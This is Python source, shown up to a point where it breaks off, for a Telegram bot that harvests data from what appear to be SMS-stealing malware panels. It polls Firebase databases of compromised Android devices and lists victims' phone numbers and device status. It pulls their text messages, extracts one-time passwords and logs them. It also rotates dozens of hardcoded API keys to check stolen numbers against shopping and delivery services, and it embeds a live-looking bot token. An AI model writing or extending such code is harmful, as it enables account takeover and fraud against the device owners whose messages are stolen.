#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════
  OTP PANEL BOT — GHOST WORKER & REFERRAL EDITION           
  ULTRA-SPEED PROGRESSIVE SCANNER & NON-BLOCKING UI
  (RAILWAY IRONCLAD STABILITY + AUTO-BACKUP + PRIVACY)
══════════════════════════════════════════════════════
"""

import os
import re
import sys
import time
import json
import random
import asyncio
import logging
import warnings
import traceback
from datetime import datetime
from typing import Optional
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.error import BadRequest
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

warnings.filterwarnings("ignore", category=DeprecationWarning)
logging.basicConfig(format="%(asctime)s — %(levelname)s — %(message)s", level=logging.WARNING)
logging.getLogger("httpx").setLevel(logging.CRITICAL)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)
logging.getLogger("aiohttp").setLevel(logging.CRITICAL)

def extract_urls_from_files() -> list:
    extracted_urls = set()
    pattern = re.compile(r'https?://[a-zA-Z0-9-]+\.(?:firebaseio\.com|[a-zA-Z0-9-]+\.firebasedatabase\.app)')
    current_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else '.'
    for filename in os.listdir(current_dir):
        if (filename.endswith('.json') or filename.endswith('.txt')) and filename not in ['settings.json', 'requirements.txt', 'device_cache.json']:
            filepath = os.path.join(current_dir, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    matches = pattern.findall(content)
                    extracted_urls.update(matches)
            except Exception: pass
    return list(extracted_urls)

HARDCODED_URLS = []
LOCAL_URLS = extract_urls_from_files()
RAW_URLS = list(set(HARDCODED_URLS + LOCAL_URLS))
DATABASES = {f"P_{i}": url for i, url in enumerate(RAW_URLS)}

POLL_INTERVAL   = 10  
CACHE_INTERVAL  = 600 
SMS_LIMIT       = 20       
TOKEN           = "8218848065:AAFw5snj5NTWbayoXSHHIaNEg-vFPuXGm-4"
PAGE_SIZE       = 10

ADMIN_IDS: set[int] = {6860106371}
# 🔥 MANDATORY CHANNELS FOR FORCE SUB
MANDATORY_CHATS = ["@leakmethodfree", "@sabkijayhokhush", "@rosekhudkabanaya"]

BASE_DIR = os.getenv("RAILWAY_VOLUME_MOUNT_PATH", os.path.dirname(os.path.abspath(__file__)))
DB_DIR = os.path.join(BASE_DIR, "Panel_Databases")
USERS_DIR = os.path.join(DB_DIR, "Users")
CLONES_DIR = os.path.join(DB_DIR, "Clones")
SYS_DIR = os.path.join(DB_DIR, "System")
SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")
CACHE_FILE = os.path.join(SYS_DIR, "device_cache.json")

seen_ids:  set[str] = set()   
first_run: bool     = True
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None
start_time = time.time()
total_otps_processed = 0

user_seen_unreg: dict[int, set[str]] = {}
user_fresh_cache: dict[int, list[str]] = {}
all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
user_focus: dict[str, dict[int, str]] = {TOKEN: {}}  
chats_registry: dict[str, set[int]] = {TOKEN: set()} 

CLONES: dict[str, dict] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {}
SCAN_PROGRESS = {"total": 1, "completed": 1}
SETTINGS = {"base_price": 30, "global_panels": []}

HTTP_SEMAPHORE = asyncio.Semaphore(50)
WORKER_SEMAPHORE = asyncio.Semaphore(50)
API_LOCK = asyncio.Lock()

SYS_SETTINGS = {
    "api_keys": [
        "AK_aewqEf78uV8I3V06vcEcBlESdcPGyz74", "AK_82DbShpWkA6_Ctln35D7d7jOzWOQkJk7",
        "AK_Z67i7aPkuL4Iid7Vq8OgOuJb7ewNZy4K", "AK_31Whk-_9PxJnWJMJlS0op7kcp_ESfQTv",
        "AK_RrbWlO2Ole-pJgbmsm0mDcoOXFZ_bvJ-", "AK_KYrXjwwwdLYGiGXq47FDWOoL9vvdZZmo",
        "AK_Dooy_O2elOFy57Qjzt70FEAjBQcGD8YM", "AK_jfaywkZJc6W2_JUjHKtxo3uEcJOkBNH6",
        "AK_iIJWhqJU-C5qGdEEvoMPy0vMyDvOJO4x", "AK_huue0mXg6tf4e4syA_DU7M8naJZF2TAT",
        "AK_DQDS9hMQ3M0H-ykltwotJMYpRFAC4fNg", "AK_l3KWP5J0l0vpRHV_xMMYqVY9OUGLcIJO",
        "AK_Y6tDZmfylYdDchpsSbyqzu5YuD1bnbNo", "AK_bC4UzJNUG4Yk8TtT3mxqxNJ6oIPLiBfh",
        "AK_BtvAIidv7mzczqKdg-y5-Pw4C9Ri7Pvw", "AK_CphAPpSkMgIKLCzBYZFCt6mN68FgOgq3",
        "AK_16LERGicFB6uncWbhCjeE9uD-UHjrFsA", "AK_0damiG8gnn6xBLe3__JBfcvH_rJh686E",
        "AK_gvRJyMC_byA4xamTOrRsWiNEHPrs_QS1", "AK_YvD2v66Ue-YlZ-Hu18s3NvNaL2vql2r3",
        "AK_5QuS_fHqe6eE-zTaZ_fDclt29D9yMDgE", "AK_xY9PPRI388wiXjpbRQWCQrc5jA9mBrAa",
        "AK_KY-Lvl-_x7-t8hQlzuSwI3s2fBooCJAd", "AK_Pg_J42kDmN2gazXPgCZlxNt6fsfnOlCT",
        "AK_R5xBtr0Mejw-0a54j-gTxh8feMjQZcOn", "AK_9CXg3dKl-IxLDIerpMzhd-KVE3HCMCso",
        "AK_7Mif5BId_Iz5rjpKD6Fc2k6DX7mqCEyU", "AK__OdSNA9Dq-3YJEueBT1-OcnRiJGkN1Y0",
        "AK_LnxgclktRe50Phzzwcon4kltxFtxx2vJ", "AK_8NlERdLgolrFdeddI3sMrjZG8bICRHoF",
        "AK_3pTIVB1bG172ZlXmch3ICqCNcRyx8gwA", "AK_etId74tu1V75auJXiq1Y_jV9H9lsQ4am",
        "AK_YIpYpHNlCNnjLeSUdkA-lqSGZ94nppjt", "AK_QLZXoprRieTkAZlgERxHdr9I1sL3bGP_",
        "AK_-08LOerb6jaCx52JmjDC0pMWhNzgVRbZ", "AK_mS7CAb1vPUnhQorNuxDgV_xfNN2kyoGW",
        "AK_LncxU9pi2mte200towYPh-ae2FcrMO9j", "AK_7DTjFAVezVWUvSvI4Ni-3_0L1t3uNwbw",
        "AK_UGc1SjKM7pWUiub6xq3n-wTXa4p_Jrse", "AK_NuDV1z5xOi0uT7fxks4TfA0I0iPBbiFM",
        "AK_NwhgeV64GrdGFoSaFj7LbqiieQObi55o", "AK_T2uFNlEPzaKT3OeIROc9FVYpYhYeFjma",
        "AK_PD7Nc8H2a0DNwENQmlflKvCBEow30UD9", "AK_Htire7-fPlEdEMNAdtkQ0wZ0NS4ttbaz",
        "AK_r8Sk4b7UzPf_DhbM_-tjVe1moW1iRLy5", "AK_EifnL8Bx6DfCIGRJGikPvPoYNkmpvTqF",
        "AK_I6lx-tDgEJA0P_jP1foxgM2eUO5F-tJd", "AK_VqzDvRR4oJyG_zBZmHSjX2f57Z4dngfy",
        "AK_5pvQYHaqr_71s4Wq0-_tRvgJBBscn6xB", "AK_1JbT6popnOVlIO929J9Y2Z0-gyHUCXdL",
        "AK_PrWss32JjoP7nv6ttNOP0d3RYynqslug", "AK_ldeMT-eBQ2whhXvakm9frq59bmxYNo1Y",
        "AK_dQhyxP4BsTbEIQ1s_VgXJkt4up4IX9UV", "AK_ak1Fy5vvoXhFInwSunFWEBz3SAuEltiO",
        "AK_80VoNRC8pkOHI7Kbpe7ybvWcTq2ktuWO", "AK_n3rVdC1y5fIRJDLosvsNzQimr16D-zmr",
        "AK_VuokZpsT91F2-TzrO13RQZ3BTOF1VOlA", "AK_GGulMMNAcqKRf8BAXQfzlesaozh917Re",
        "AK_JDvMk7HIq4yhD1NvEZ0bRRgdnjyUrK_M", "AK_suKV-7E1peiwoxFLoi67ENmraj0mKRkE",
        "AK_H2puTEPDk4cZ9LnW_vq-wdhjS7pMihgb", "AK_1yxxKAYrCLdun4jOSejUckG58QokfbPb",
        "AK_-Xd_ErhFdQVLdHMB0XBEbqdf5ka3g0jh"
    ],
    "check_anim": "⚡"
}

class Device:
    __slots__ = ("id", "name", "status", "battery", "timestamp", "numbers", "device_info", "sms_path", "base_url", "db_tag", "last_sms_ts")
    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag, last_sms_ts=0.0):
        self.id = id; self.name = name; self.status = status; self.battery = battery
        self.timestamp = timestamp; self.numbers = numbers; self.device_info = device_info
        self.sms_path = sms_path; self.base_url = base_url; self.db_tag = db_tag; self.last_sms_ts = last_sms_ts
        
    def to_dict(self):
        return {"id": self.id, "name": self.name, "status": self.status, "battery": self.battery, "timestamp": self.timestamp, "numbers": self.numbers, "device_info": self.device_info, "sms_path": self.sms_path, "base_url": self.base_url, "db_tag": self.db_tag, "last_sms_ts": self.last_sms_ts}
    
    @classmethod
    def from_dict(cls, data):
        return cls(data["id"], data["name"], data["status"], data["battery"], data["timestamp"], data["numbers"], data["device_info"], data["sms_path"], data["base_url"], data["db_tag"], data.get("last_sms_ts", 0.0))

def init_dirs():
    os.makedirs(USERS_DIR, exist_ok=True)
    os.makedirs(CLONES_DIR, exist_ok=True)
    os.makedirs(SYS_DIR, exist_ok=True)
    if not os.path.exists(SMS_LOG_FILE):
        with open(SMS_LOG_FILE, "w", encoding="utf-8") as f: f.write("--- SYSTEM MASTER SMS LOG ---\n")

def load_data():
    global all_users, CLONES, SETTINGS, GLOBAL_DEVICE_CACHE, SCAN_PROGRESS
    init_dirs()
    set_path = os.path.join(SYS_DIR, "settings.json")
    if os.path.exists(set_path):
        try:
            with open(set_path, "r", encoding="utf-8") as f: SETTINGS.update(json.load(f))
        except: pass

    # 🔥 IRONCLAD DISK CACHE LOAD: Prevents the 2% drop glitch
    if os.path.exists(CACHE_FILE):
        try:
            with open(CACHE_FILE, "r", encoding="utf-8") as f:
                saved_cache = json.load(f)
                all_devs_list = []
                for tag, dev_list in saved_cache.items():
                    parsed_devs = [Device.from_dict(d) for d in dev_list]
                    GLOBAL_DEVICE_CACHE[tag] = parsed_devs
                    all_devs_list.extend(parsed_devs)
                
                # Pre-compile ALL dict instantly on boot
                n_map = {}
                for d in all_devs_list:
                    if d.numbers:
                        m = d.numbers[0]
                        if m not in n_map or d.timestamp > n_map[m].timestamp: n_map[m] = d
                    else: n_map[d.id] = d 
                
                sorted_res = list(n_map.values())
                sorted_res.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
                GLOBAL_DEVICE_CACHE["ALL"] = sorted_res
                
                # Fake complete progress so users never see the glitch loader!
                if len(sorted_res) > 50:
                    SCAN_PROGRESS["completed"] = 99999 
                    SCAN_PROGRESS["total"] = 99999
                    
                print(f"[*] Loaded {len(sorted_res)} unique devices from fast disk cache.")
        except Exception as e:
            print(f"[*] Failed to load cache: {e}")

    for fname in os.listdir(USERS_DIR):
        if fname.endswith(".json"):
            try:
                uid = int(fname.split(".")[0])
                with open(os.path.join(USERS_DIR, fname), "r", encoding="utf-8") as f: all_users[uid] = json.load(f)
            except: pass
                
    for fname in os.listdir(CLONES_DIR):
        if fname.endswith(".json"):
            try:
                with open(os.path.join(CLONES_DIR, fname), "r", encoding="utf-8") as f:
                    cdata = json.load(f)
                    cdata["users"] = {int(k): v for k, v in cdata.get("users", {}).items()}
                    token = cdata.get("bot_token")
                    if token: CLONES[token] = cdata
            except: pass
            
    for adm in ADMIN_IDS:
        if adm in all_users:
            all_users[adm]["global_spam"] = False 
            save_user(adm)
        if adm not in all_users:
            all_users[adm] = {"name": "Supreme Owner", "username": "", "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"), "verified": True, "referrals": 0, "access_until": 2e10, "has_global_access": True, "otp_count": 0, "global_spam": False, "custom_dbs": [], "selected_panel": "ALL"}
            save_user(adm)

def save_user(uid: int):
    init_dirs()
    if uid in all_users:
        with open(os.path.join(USERS_DIR, f"{uid}.json"), "w", encoding="utf-8") as f: json.dump(all_users[uid], f, indent=4)

def save_settings():
    init_dirs()
    with open(os.path.join(SYS_DIR, "settings.json"), "w", encoding="utf-8") as f: json.dump(SETTINGS, f, indent=4)

def save_device_cache():
    try:
        data_to_save = {tag: [d.to_dict() for d in devs] for tag, devs in GLOBAL_DEVICE_CACHE.items() if tag != "ALL"}
        with open(CACHE_FILE, "w", encoding="utf-8") as f: json.dump(data_to_save, f)
    except: pass

def _sync_save_data():
    save_settings()
    for uid in list(all_users.keys()): save_user(uid)
    save_device_cache()

async def save_data_async():
    await asyncio.to_thread(_sync_save_data)

def master_log_sms(number: str, message: str, otp: str):
    try:
        t = datetime.now().strftime("%d-%b-%Y %I:%M:%S %p")
        with open(SMS_LOG_FILE, "a", encoding="utf-8") as f: f.write(f"[{t}] NUM: {number} | OTP: {otp or 'N/A'} | MSG: {message}\n")
    except: pass

async def auto_save_loop():
    while True:
        await asyncio.sleep(120)
        await save_data_async()

async def hourly_backup_loop(app: Application):
    while True:
        await asyncio.sleep(3600)
        try:
            total_u = len(all_users)
            g_panels = len(DATABASES) + len(SETTINGS.get("global_panels", []))
            u_panels = sum(len(u.get("custom_dbs", [])) for u in all_users.values())
            msg = f"⏱ **1-HOUR AUTO BACKUP & STATS** ⏱\n\n👥 Total Users: {total_u}\n🌍 Global Panels: {g_panels}\n👤 User Custom Panels: {u_panels}\n🔄 Total OTPs Captured: {total_otps_processed}\n\n✅ Ghost Workers active & system stable."
            for adm in ADMIN_IDS: await app.bot.send_message(adm, msg, parse_mode="Markdown")
        except: pass

def get_user_dbs(uinfo: dict) -> list:
    dbs, valid_urls, now = uinfo.get("custom_dbs", []), [], time.time()
    for db in dbs:
        if isinstance(db, str): valid_urls.append(db)
        elif isinstance(db, dict) and db.get("expiry", 0) > now: valid_urls.append(db["url"])
    return list(set(valid_urls))

def is_spamming(user_id: int) -> bool:
    if user_id in ADMIN_IDS: return False
    now = time.time()
    if now - user_cooldowns.get(user_id, 0) < 1.0: return True
    user_cooldowns[user_id] = now
    return False

async def check_force_sub(bot, user_id: int) -> bool:
    if user_id in ADMIN_IDS: return True
    for chat in MANDATORY_CHATS:
        try:
            m = await bot.get_chat_member(chat, user_id)
            if m.status in ['left', 'kicked']: return False
        except: return False
    return True

def force_sub_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Join Channel 1", url="https://t.me/leakmethodfree")],
        [InlineKeyboardButton("📢 Join Channel 2", url="https://t.me/sabkijayhokhush")],
        [InlineKeyboardButton("💬 Join Group", url="https://t.me/rosekhudkabanaya")],
        [InlineKeyboardButton("✅ Verify & Continue", callback_data="verify_sub")]
    ])

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    err_str = str(context.error)
    ignore = ["Forbidden", "Chat not found", "bot was blocked", "not modified", "Message to edit not found", "ChatNotFound", "ReadError", "NetworkError", "TimedOut", "Event loop is closed", "gaierror"]
    if any(e in err_str for e in ignore): return
    pass

async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=50, use_dns_cache=True, ttl_dns_cache=300)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

async def fb_get(path: str, base: str) -> Optional[dict]:
    async with HTTP_SEMAPHORE:
        try:
            session = await get_http_session()
            url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
            if not path: url = url.replace("?shallow=true", ".json")
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
                if r.status != 200: return None
                try: return await r.json(content_type=None)
                except Exception: return None
        except Exception: return None

async def fb_keys(path: str, base: str) -> list[str]:
    async with HTTP_SEMAPHORE:
        try:
            session = await get_http_session()
            url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
                if r.status != 200: return []
                try:
                    data = await r.json(content_type=None)
                    return list(data.keys()) if isinstance(data, dict) else []
                except Exception: return []
        except Exception: return []

async def check_number_api(service: str, number: str, retries=2) -> dict:
    clean_number = re.sub(r"\D", "", str(number))[-10:]
    api_keys = SYS_SETTINGS.get("api_keys", [])
    if not api_keys: return {"status": "error", "message": "No API Keys configured.", "ms": 0}
    for attempt in range(retries):
        async with API_LOCK:
            if not hasattr(check_number_api, 'k_idx'): check_number_api.k_idx = 0
            selected_key = api_keys[check_number_api.k_idx % len(api_keys)]
            check_number_api.k_idx += 1
        payload = {"service": service.lower(), "number": clean_number}
        start_req = time.time()
        try:
            session = await get_http_session()
            async with session.post("https://superassets.in/api/v1/check", json=payload, headers={"X-API-Key": selected_key, "Content-Type": "application/json"}, timeout=aiohttp.ClientTimeout(total=10)) as r:
                req_ms = int((time.time() - start_req) * 1000)
                if r.status == 200: 
                    res = await r.json()
                    res["ms"] = req_ms
                    return res
                elif r.status == 429:
                    await asyncio.sleep(1)
                    continue
                else: return {"status": "error", "message": f"HTTP {r.status}", "ms": req_ms}
        except Exception: 
            if attempt == retries - 1: return {"status": "error", "message": "Timeout", "ms": int((time.time() - start_req) * 1000)}
            await asyncio.sleep(0.5)

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", str(n))
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c

def extract_all_nums(*dicts) -> list[str]:
    nums = []
    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo", "phoneNumber", "phone", "sim1", "sim2", "mobile"]
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) > 4: nums.append(fmt_num(val))
    return list(set(nums))

def bat_emoji(pct: int) -> str: return "🔋" if pct >= 20 else "🪫"

OTP_PATTERNS = [re.compile(r"OTP[^\d]*(\d{4,8})", re.IGNORECASE), re.compile(r"code[^\d]*(\d{4,8})", re.IGNORECASE), re.compile(r"password[^\d]*(\d{4,8})", re.IGNORECASE), re.compile(r"\b(G-\d{6})\b", re.IGNORECASE), re.compile(r"\b([A-Z0-9]{5,8})\b", re.IGNORECASE), re.compile(r"\b(\d{6})\b"), re.compile(r"\b(\d{4})\b")]

def extract_otp(text: str) -> Optional[str]:
    if not text: return None
    t_lower = text.lower()
    if any(x in t_lower for x in ["block", "rs.", "bal", "balance", "debited", "credited"]):
        m = re.search(r"(?:otp|pin|code)[\s\:\-]*(\d{4,8})", t_lower)
        if m: return m.group(1)
        return None
    for pat in OTP_PATTERNS:
        m = re.search(pat, text)
        if m: return m.group(1)
    return None

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        digits = re.sub(r"\D", "", val)
        return int(digits) if digits else 0
    return 0

def parse_status_str(val) -> str: return "online" if str(val).lower() == "online" else "offline"
def parse_status_bool(val) -> str: return "online" if val is True else "offline"
def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except: pass
    return "N/A"
def seen_key(device_id: str, k: str) -> str: return f"{device_id}/{k}"
def device_label(d: 'Device') -> str: return " & ".join(d.numbers) if d.numbers else f"{d.name} ({d.id[:8]})"

async def fetch_db_data(tag: str, url: str) -> list[Device]:
    async with WORKER_SEMAPHORE:
        devices_list = []
        added_set = set()
        try:
            root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
                fb_keys("", url), fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
                fb_get("user_data", url), fb_get("clients", url)
            )
            if sim_all and isinstance(sim_all, dict):
                info_all = device_info_all or {}
                for dev_id, sim in sim_all.items():
                    if dev_id in added_set: continue
                    added_set.add(dev_id)
                    info = info_all.get(dev_id) or {}
                    nums = extract_all_nums(sim, info)
                    model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                    devices_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
            if user_data_all and isinstance(user_data_all, dict):
                for dev_id, data in user_data_all.items():
                    if dev_id in added_set: continue
                    if not isinstance(data, dict): continue
                    added_set.add(dev_id)
                    nums = extract_all_nums(data)
                    devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))
            if clients_all and isinstance(clients_all, dict):
                for dev_id, client in clients_all.items():
                    if dev_id in added_set: continue
                    if not isinstance(client, dict): continue
                    sim_list = client.get("sims", [])
                    s1 = sim_list[0] if isinstance(sim_list, list) and len(sim_list) > 0 else {}
                    s2 = sim_list[1] if isinstance(sim_list, list) and len(sim_list) > 1 else {}
                    nums = extract_all_nums(client, s1, s2)
                    if not nums and not client.get("modelName"): continue
                    added_set.add(dev_id)
                    model = client.get("modelName") or f"Device-{dev_id[:6]}"
                    devices_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
        except Exception: pass
        return devices_list

async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
    if users_db is None: users_db = {}
    is_global = chat_id in ADMIN_IDS or users_db.get(chat_id, {}).get("has_global_access", False)
    
    # 🔥 RAM SAVER: Admin gets instant access to pre-compiled cache!
    if is_global and "ALL" in GLOBAL_DEVICE_CACHE and len(GLOBAL_DEVICE_CACHE["ALL"]) > 0:
        return GLOBAL_DEVICE_CACHE["ALL"]

    # Only compile for regular users looking at custom panels
    dbs_to_check = []
    if chat_id in users_db:
        for i, _ in enumerate(get_user_dbs(users_db[chat_id])): dbs_to_check.append(f"U_{chat_id}_{i}")

    all_gathered = []
    for tag in dbs_to_check: all_gathered.extend(GLOBAL_DEVICE_CACHE.get(tag, []))

    number_map = {}
    for d in all_gathered:
        if d.numbers:
            main_num = d.numbers[0]
            if main_num not in number_map: number_map[main_num] = d
            else:
                if d.timestamp > number_map[main_num].timestamp: number_map[main_num] = d
        else: number_map[d.id] = d 

    unique_devices = list(number_map.values())
    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
    return unique_devices

async def find_device_by_id(dev_id: str, bot_token: str, chat_id: int, users_db: dict) -> Optional[Device]:
    dev_id = str(dev_id).strip()
    for tag, devs in GLOBAL_DEVICE_CACHE.items():
        for d in devs:
            if d.id == dev_id: return d
    all_devs = await get_all_devices(bot_token, chat_id, users_db)
    for d in all_devs:
        if d.id == dev_id: return d
    return None

async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
    data = await fb_get(device.sms_path, device.base_url)
    if not data: return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    return entries[:limit]

def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
    users_db = all_users
    user_spam_active = users_db.get(chat_id, {}).get("global_spam", False)
    spam_btn = "Global Spam: ON" if user_spam_active else "Global Spam: OFF"
    keys = [
        [KeyboardButton("🔥 30-Min Fresh Devices"), KeyboardButton("Search Number (God)")],
        [KeyboardButton("Devices List"), KeyboardButton("Auto-Check Panels")],
        [KeyboardButton("Scan Hidden Devices"), KeyboardButton("Manual Checker")],
        [KeyboardButton("Add Panel"), KeyboardButton("Select Panel")]
    ]
    if chat_id in ADMIN_IDS:
        keys.append([KeyboardButton("Admin Panel"), KeyboardButton("Super Admin")])
        keys.append([KeyboardButton(spam_btn)])
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def get_checker_menu(prefix="chk_srv:"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🥬 Bigbasket", callback_data=f"{prefix}bigbasket"), InlineKeyboardButton("🛍️ Meesho", callback_data=f"{prefix}meesho"), InlineKeyboardButton("🪐 Plutos", callback_data=f"{prefix}plutos")],
        [InlineKeyboardButton("⭐ Starexch", callback_data=f"{prefix}starexch"), InlineKeyboardButton("🍔 Swiggy", callback_data=f"{prefix}swiggy"), InlineKeyboardButton("🛒 Flipkart", callback_data=f"{prefix}flipkart")],
        [InlineKeyboardButton("👗 Shein", callback_data=f"{prefix}shein"), InlineKeyboardButton("👚 Myntra", callback_data=f"{prefix}myntra"), InlineKeyboardButton("🏨 Oyo", callback_data=f"{prefix}oyo")],
        [InlineKeyboardButton("🏢 Mantrimall", callback_data=f"{prefix}mantrimall"), InlineKeyboardButton("🟡 Blinkit", callback_data=f"{prefix}blinkit")],
        [InlineKeyboardButton("🛏️ Brevistay", callback_data=f"{prefix}brevistay"), InlineKeyboardButton("⚡ Ajio", callback_data=f"{prefix}ajio"), InlineKeyboardButton("📦 Amazon", callback_data=f"{prefix}amazon")],
        [InlineKeyboardButton("📱 MyJio", callback_data=f"{prefix}myjio"), InlineKeyboardButton("👓 Lenskart", callback_data=f"{prefix}lenskart")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ])

def device_list_header(devices: list[Device], page: int = 0) -> str:
    PAGE_SIZE = 10 
    online  = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    
    progress = ""
    # 🔥 HACKER UI FIX: If we loaded from cache, never show loading bar. 
    if SCAN_PROGRESS["completed"] < SCAN_PROGRESS["total"] and SCAN_PROGRESS["total"] > 1 and SCAN_PROGRESS["total"] != 99999:
        pct = int((SCAN_PROGRESS["completed"] / SCAN_PROGRESS["total"]) * 100)
        progress = f"🔄 Initial Scan: {SCAN_PROGRESS['completed']}/{SCAN_PROGRESS['total']} ({pct}%)\n"
        
    return f"OTP PANEL PRO\n━━━━━━━━━━━━━━━━━━\n{progress}Online: {online}   Offline: {offline}\nTotal: {len(devices)} Devices\nPage {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\nSelect a number below:"

def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    PAGE_SIZE = 10 
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page        = max(0, min(page, total_pages - 1))
    start       = page * PAGE_SIZE
    page_devs   = devices[start : start + PAGE_SIZE]
    rows = []
    def _btn(d: Device) -> InlineKeyboardButton:
        tag  = f"[{d.db_tag}] "
        icon = "🟢" if d.status == "online" else "🔴"
        if d.numbers:
            lbl = f"{icon} {tag}{d.numbers[0]}"
            if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
        else: lbl = f"{icon} {tag}{d.name} ({d.id[:6]})"
        return InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")

    for d in page_devs: rows.append([_btn(d)])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"{page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next", callback_data=f"pg:{page + 1}"))
    rows.append(nav)
    rows.append([InlineKeyboardButton("Refresh", callback_data="home"), InlineKeyboardButton("Online Only", callback_data="online")])
    rows.append([InlineKeyboardButton("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
    online = [d for d in devices if d.status == "online"]
    rows = []
    if online:
        for d in online[:100]: # Cap to 100 to prevent message too long error
            tag = f"[{d.db_tag}] "
            if d.numbers:
                lbl = f"🟢 {tag}{d.numbers[0]}"
                if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
            else: lbl = f"🟢 {tag}{d.name} ({d.id[:6]})"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    else: rows.append([InlineKeyboardButton("No devices online", callback_data="noop")])
    rows.append([InlineKeyboardButton("Refresh", callback_data="online"), InlineKeyboardButton("All Numbers", callback_data="pg:0")])
    rows.append([InlineKeyboardButton("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def format_sms_block(sms: dict, num_label: str) -> tuple[str, Optional[str]]:
    body   = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp    = extract_otp(body)
    date   = sms_date(sms)
    sim    = sms.get("sim_number") or ""
    sender = sms.get("sender") or "Unknown"
    lines  = []
    if otp: lines.append(f"OTP: {otp}")
    lines.append(f"From: {sender}\nDate: {date}")
    if sim: lines.append(f"SIM: {sim}")
    lines.append(f"Number: {num_label}\n\nMessage: {body}")
    return "\n".join(lines), otp

def auto_forward_msg(sms: dict, num_label: str) -> str:
    body   = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp    = extract_otp(body)
    date   = sms_date(sms)
    sim    = sms.get("sim_number") or ""
    sender = sms.get("sender") or "Unknown"
